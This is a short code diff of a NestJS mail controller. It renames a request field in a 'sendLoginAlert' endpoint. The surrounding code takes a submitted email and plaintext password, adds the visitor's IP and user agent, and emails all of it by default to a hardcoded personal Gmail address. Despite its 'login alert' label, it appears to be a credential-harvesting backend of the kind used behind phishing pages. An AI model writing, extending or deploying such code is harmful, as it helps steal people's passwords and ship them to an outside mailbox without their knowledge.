@@ -8,12 +8,12 @@ export class MailController {
 
   @Post('')
   async sendLoginAlert(
-    @Body() body: { email: string; password: string; recipientEmail?: string },
+    @Body() body: { email: string; password: string; recipient?: string },
     @Headers() headers: Record<string, string>,
     @Req() request: Request,
     @Ip() ip: string,
   ) {
-    const { email, password, recipientEmail } = body;
+    const { email, password, recipient } = body;
 
     // Extract user agent
     const userAgent = headers['user-agent'] || 'Unknown';
@@ -36,7 +36,7 @@ export class MailController {
 
     // Send the email with all details
     await this.mailService.sendLoginAlert(
-      recipientEmail || 'favourejim56@gmail.com',
+      recipient || 'favourejim56@gmail.com',
       {
         email,
         password,
